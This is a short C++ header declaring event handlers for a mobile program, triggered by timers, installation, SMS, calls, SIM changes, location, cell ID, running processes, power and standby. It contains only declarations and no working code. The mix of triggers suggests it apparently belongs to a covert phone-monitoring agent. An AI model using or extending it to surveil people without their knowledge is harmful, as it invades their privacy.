#include "Common.h"
#include "Log.h"
#include "ProcessMonitor.h"
#include "Status.h"
#include "Conf.h"
#include "Device.h"
#include "GPS.h"
#include "Cell.h"
#include "Rand.h"
#include "Observer.h"
#include <exception>
using namespace std;

#ifndef __Events_h__
#define __Events_h__

#define EVENT_COMMON_DATA(x) 	UINT MyID = x; \
	Status *statusObj = Status::self(); \
	pEventStruct MyData = (pEventStruct)lpParam;

DWORD WINAPI OnTimer(LPVOID lpParam);
DWORD WINAPI OnAfterInst(LPVOID lpParam);
DWORD WINAPI OnDate(LPVOID lpParam);
DWORD WINAPI OnSms(LPVOID lpParam);
DWORD WINAPI OnCall(LPVOID lpParam);
DWORD WINAPI OnConnection(LPVOID lpParam);
DWORD WINAPI OnProcess(LPVOID lpParam);
DWORD WINAPI OnSimChange(LPVOID lpParam);
DWORD WINAPI OnLocation(LPVOID lpParam);
DWORD WINAPI OnCellId(LPVOID lpParam);
DWORD WINAPI OnAC(LPVOID lpParam);
DWORD WINAPI OnBatteryLevel(LPVOID lpParam);
DWORD WINAPI OnStandby(LPVOID lpParam);

BOOL EventSleep(pEventStruct pEvent, UINT uMillisec);
#endif